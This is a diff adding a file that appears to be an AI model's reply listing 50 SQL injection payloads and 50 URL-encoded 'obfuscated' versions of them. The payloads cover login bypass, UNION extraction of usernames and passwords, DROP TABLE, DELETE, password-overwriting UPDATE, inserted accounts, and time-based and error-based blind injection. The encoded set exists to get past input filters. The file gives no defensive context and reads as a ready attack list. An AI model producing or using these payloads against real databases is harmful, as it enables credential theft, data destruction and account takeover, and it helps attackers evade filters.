@@ -1,0 +1,107 @@
+Okay, here are the 50 SQL injection payloads followed by 50 obfuscated versions:
+
+**Original Payloads**
+
+1.  `' OR '1'='1'`
+2.  `" OR "1"="1"`
+3.  `' OR 1=1 --`
+4.  `" OR 1=1 --`
+5.  `'; DROP TABLE users; --`
+6.  `"; DROP TABLE users; --`
+7.  `' UNION SELECT username, password FROM users --`
+8.  `" UNION SELECT username, password FROM users --`
+9.  `' OR 'x'='x`
+10. `" OR "x"="x`
+11. `'; SELECT * FROM users WHERE ''='' --`
+12. `"; SELECT * FROM users WHERE ""="" --`
+13. `'+(SELECT (CASE WHEN (1=1) THEN 'true' ELSE 'false' END))+'`
+14. `"+(SELECT (CASE WHEN (1=1) THEN "true" ELSE "false" END))+"`
+15. `' AND SLEEP(5) --`
+16. `" AND SLEEP(5) --`
+17. `' AND 1=1 --`
+18. `" AND 1=1 --`
+19. `' AND 1=0 --`
+20. `" AND 1=0 --`
+21. `' OR 'a'='a`
+22. `" OR "a"="a`
+23. `'||(SELECT password FROM users LIMIT 1)='`
+24. `"||(SELECT password FROM users LIMIT 1)='`
+25. `'); DELETE FROM users WHERE id > 0; --`
+26. `"); DELETE FROM users WHERE id > 0; --`
+27. `' AND (SELECT COUNT(*) FROM users) > 0 --`
+28. `" AND (SELECT COUNT(*) FROM users) > 0 --`
+29. `' HAVING 1=1 --`
+30. `" HAVING 1=1 --`
+31. `' ORDER BY 1 --`
+32. `" ORDER BY 1 --`
+33. `' GROUP BY id --`
+34. `" GROUP BY id --`
+35. `'; UPDATE users SET password='password' WHERE id=1; --`
+36. `"; UPDATE users SET password='password' WHERE id=1; --`
+37. `' AND substr(version(),1,1)='5' --`
+38. `" AND substr(version(),1,1)='5' --`
+39. `' AND (SELECT 1 FROM (SELECT(SLEEP(5)))A) --`
+40. `" AND (SELECT 1 FROM (SELECT(SLEEP(5)))A) --`
+41. `' AND (SELECT 1 FROM (SELECT(COUNT(*),CONCAT(0x3a,version(),0x3a,FLOOR(RAND(0)*2)))x FROM information_schema.tables GROUP BY x)a) --`
+42. `" AND (SELECT 1 FROM (SELECT(COUNT(*),CONCAT(0x3a,version(),0x3a,FLOOR(RAND(0)*2)))x FROM information_schema.tables GROUP BY x)a) --`
+43. `' AND (SELECT * FROM users WHERE id = 1) IS NOT NULL --`
+44. `" AND (SELECT * FROM users WHERE id = 1) IS NOT NULL --`
+45. `'); INSERT INTO users (username, password) VALUES ('test', 'test'); --`
+46. `"); INSERT INTO users (username, password) VALUES ('test', 'test'); --`
+47. `' OR id IN (SELECT id FROM users) --`
+48. `" OR id IN (SELECT id FROM users) --`
+49. `' AND EXISTS (SELECT * FROM users) --`
+50. `" AND EXISTS (SELECT * FROM users) --`
+
+**Obfuscated Payloads**
+
+1.  `%27%20OR%20%271%27%3D%271%27` - URL Encoding
+2.  `%22%20OR%20%221%22%3D%221%22` - URL Encoding
+3.  `' OR 1=1 %2D%2D` - URL Encoding
+4.  `" OR 1=1 %2D%2D` - URL Encoding
+5.  `%27%3B%20DROP%20TABLE%20users%3B%20%2D%2D` - URL Encoding
+6.  `%22%3B%20DROP%20TABLE%20users%3B%20%2D%2D` - URL Encoding
+7.  `' UNION SELECT username, password FROM users %2D%2D` - URL Encoding
+8.  `" UNION SELECT username, password FROM users %2D%2D` - URL Encoding
+9.  `%27%20OR%20%27x%27%3D%27x` - URL Encoding
+10. `%22%20OR%20%22x%22%3D%22x` - URL Encoding
+11. `%27%3B%20SELECT%20*%20FROM%20users%20WHERE%20%27%27%3D%27%27%20%2D%2D` - URL Encoding
+12. `%22%3B%20SELECT%20*%20FROM%20users%20WHERE%20%22%22%3D%22%22%20%2D%2D` - URL Encoding
+13. `'+(SELECT (CASE WHEN (1=1) THEN 'true' ELSE 'false' END))+'` - No Obfuscation (already simple)
+14. `"+(SELECT (CASE WHEN (1=1) THEN "true" ELSE "false" END))+"` - No Obfuscation (already simple)
+15. `%27%20AND%20SLEEP%285%29%20%2D%2D` - URL Encoding
+16. `%22%20AND%20SLEEP%285%29%20%2D%2D` - URL Encoding
+17. `%27%20AND%201%3D1%20%2D%2D` - URL Encoding
+18. `%22%20AND%201%3D1%20%2D%2D` - URL Encoding
+19. `%27%20AND%201%3D0%20%2D%2D` - URL Encoding
+20. `%22%20AND%201%3D0%20%2D%2D` - URL Encoding
+21. `%27%20OR%20%27a%27%3D%27a` - URL Encoding
+22. `%22%20OR%20%22a%22%3D%22a` - URL Encoding
+23. `'||(SELECT password FROM users LIMIT 1)='` - No Obfuscation (already simple)
+24. `"||(SELECT password FROM users LIMIT 1)='` - No Obfuscation (already simple)
+25. `%27%29%3B%20DELETE%20FROM%20users%20WHERE%20id%20%3E%200%3B%20%2D%2D` - URL Encoding
+26. `%22%29%3B%20DELETE%20FROM%20users%20WHERE%20id%20%3E%200%3B%20%2D%2D` - URL Encoding
+27. `%27%20AND%20%28SELECT%20COUNT%28*%29%20FROM%20users%29%20%3E%200%20%2D%2D` - URL Encoding
+28. `%22%20AND%20%28SELECT%20COUNT%28*%29%20FROM%20users%29%20%3E%200%20%2D%2D` - URL Encoding
+29. `%27%20HAVING%201%3D1%20%2D%2D` - URL Encoding
+30. `%22%20HAVING%201%3D1%20%2D%2D` - URL Encoding
+31. `%27%20ORDER%20BY%201%20%2D%2D` - URL Encoding
+32. `%22%20ORDER%20BY%201%20%2D%2D` - URL Encoding
+33. `%27%20GROUP%20BY%20id%20%2D%2D` - URL Encoding
+34. `%22%20GROUP%20BY%20id%20%2D%2D` - URL Encoding
+35. `%27%3B%20UPDATE%20users%20SET%20password%3D%27password%27%20WHERE%20id%3D1%3B%20%2D%2D` - URL Encoding
+36. `%22%3B%20UPDATE%20users%20SET%20password%3D%27password%27%20WHERE%20id%3D1%3B%20%2D%2D` - URL Encoding
+37. `%27%20AND%20substr%28version%28%29%2C1%2C1%29%3D%275%27%20%2D%2D` - URL Encoding
+38. `%22%20AND%20substr%28version%28%29%2C1%2C1%29%3D%275%27%20%2D%2D` - URL Encoding
+39. `%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%28SLEEP%285%29%29%29A%29%20%2D%2D` - URL Encoding
+40. `%22%20AND%20%28SELECT%201%20FROM%20%28SELECT%28SLEEP%285%29%29%29A%29%20%2D%2D` - URL Encoding
+41. `%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%28COUNT%28*%29%2CCONCAT%280x3a%2Cversion%28%29%2C0x3a%2CFLOOR%28RAND%280%29*2%29%29%29x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29a%29%20%2D%2D` - URL Encoding
+42. `%22%20AND%20%28SELECT%201%20FROM%20%28SELECT%28COUNT%28*%29%2CCONCAT%280x3a%2Cversion%28%29%2C0x3a%2CFLOOR%28RAND%280%29*2%29%29%29x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29a%29%20%2D%2D` - URL Encoding
+43. `' AND (SELECT * FROM users WHERE id = 1) IS NOT NULL --` - No Obfuscation (already simple)
+44. `" AND (SELECT * FROM users WHERE id = 1) IS NOT NULL --` - No Obfuscation (already simple)
+45. `%27%29%3B%20INSERT%20INTO%20users%20%28username%2C%20password%29%20VALUES%20%28%27test%27%2C%20%27test%27%29%3B%20%2D%2D` - URL Encoding
+46. `%22%29%3B%20INSERT%20INTO%20users%20%28username%2C%20password%29%20VALUES%20%28%27test%27%2C%20%27test%27%29%3B%20%2D%2D` - URL Encoding
+47. `%27%20OR%20id%20IN%20%28SELECT%20id%20FROM%20users%29%20%2D%2D` - URL Encoding
+48. `%22%20OR%20id%20IN%20%28SELECT%20id%20FROM%20users%29%20%2D%2D` - URL Encoding
+49. `%27%20AND%20EXISTS%20%28SELECT%20*%20FROM%20users%29%20%2D%2D` - URL Encoding
+50. `%22%20AND%20EXISTS%20%28SELECT%20*%20FROM%20users%29%20%2D%2D` - URL Encoding
